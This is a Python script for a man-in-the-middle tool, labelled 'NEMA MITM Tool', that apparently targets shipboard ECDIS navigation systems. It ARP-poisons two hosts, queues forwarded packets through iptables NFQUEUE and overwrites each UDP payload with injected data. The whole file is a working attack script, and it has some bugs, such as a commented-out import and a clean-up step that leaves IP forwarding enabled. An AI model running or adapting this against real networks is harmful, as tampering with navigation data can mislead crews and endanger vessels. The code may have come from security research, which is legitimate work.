from scapy.all import *
from scipy.fft import dst
#from netfilterqueue import NetfilterQueue
import codecs
import os
import time
import sys
import argparse
from multiprocessing import Process

target_ip = "10.0.2.26"
src_ip = "10.0.2.25"

class MITM:
    def __init__(self, target_ip,  src_ip, iface):
        self.target_ip = target_ip
        self.src_ip = src_ip
        self.iface = iface
        self.src_mac = None
        self.target_mac = None
        self.nfqueue = NetfilterQueue()

    def modify(self, packet):
        pkt = packet.get_payload()
        
        pktIP = IP(pkt)
        pktIP.show()
        if pktIP.haslayer(UDP) and pktIP.getlayer(UDP).payload:
            old_len = len(pktIP[UDP].payload)
            pktIP[UDP].remove_payload()
            pktIP[UDP].add_payload(b"modified")

            new_len = len(pktIP[UDP].payload)
            pktIP[IP].len = pktIP[IP].len + (new_len - old_len)
            del pktIP[IP].chksum
            del pktIP[UDP].chksum
            del pktIP[UDP].len
            pktIP.show2()
            packet.set_payload(bytes(pktIP))
            
        packet.accept()

    def setup(self):
        iptable_config = f"sudo iptables -A FORWARD -j NFQUEUE --queue-num 0 -d {target_ip}"
        ip_forward = "sudo sysctl net.ipv4.ip_forward=1"
        os.system(iptable_config)
        os.system(ip_forward)
        self.nfqueue.bind(0, self.modify)

    def get_mac(self, ip):
        try:
            ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip),timeout =2, iface=self.iface, inter=0.1)
            for snd,rcv in ans:
                return rcv.sprintf(r"%Ether.src%")
        except Exception as e:
            print(f"[!] Could not find MAC address for {ip}")
            print(f"[!] Exiting....")
        
    def re_arp(self):
        try:
            print("[*] Restoring Targets MAC")
            send(ARP(op = 2, pdst = self.target_ip, psrc = self.src_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = self.src_mac), count = 7)
            send(ARP(op = 2, pdst = self.src_ip, psrc = self.target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = self.target_mac), count = 7)
        except Exception:
            print("[!] Error while restoring targets..")
            print("[!] Exiting.....")

    def arp_poison(self):
        try:
            print("[*] Starting ARP Poisoning")
            send(ARP(op = 2, pdst = self.src_ip, psrc = self.target_ip, hwdst = self.src_mac))
            send(ARP(op = 2, pdst = self.src_ip, psrc = self.target_ip, hwdst = self.src_mac))
        except Exception as e:
            print("[!] ARP Poisoning Failed...")
            print("[!] Exiting")

    def clean_up(self):
        print("[*] Flushing iptables")
        os.system('iptables -F')
        os.system('iptables -X')
        print("[*] Disabling IP forwarding")
        os.system("sudo sysctl net.ipv4.ip_forward=1")

    def start_mitm(self):
        try:
            print(f"[*] Getting MAC address of {self.src_ip}", end=" ..... ")
            self.src_mac = self.get_mac(self.src_ip)
            print(self.src_mac)
            
            print(f"[*] Getting MAC address of {self.target_ip}", end=" ..... ")
            self.target_mac = self.get_mac(self.target_ip)
            print(self.src_mac)

            self.arp_poison()
            time.sleep(1.5)

        except Exception as e:
            print("[!] MITM failed..")
            self.clean_up()
            sys.exit(1)

    def stop_mitm(self):
        self.clean_up()




def get_input():
    parser = argparse.ArgumentParser(description="NEMA MITM Tool")
    parser.add_argument("-t","--target-ip", help="Target system IP address (Eg: ECDIS)", required=True)
    parser.add_argument("-s", "--source-ip", help="Source system IP address", required=True)
    parser.add_argument("-i", "--interface", help="Interface name", required=True)

    args = parser.parse_args()
    return args

if __name__ == '__main__':

    args = get_input()
    
    mitm = MITM(args.target_ip, args.source_ip, args.interface)
    mitm.start_mitm()
    
    try:
        print ("[*] waiting for data")
        mitm.nfqueue.run()
    except KeyboardInterrupt:
        pass

    mitm.nfqueue.unbind()
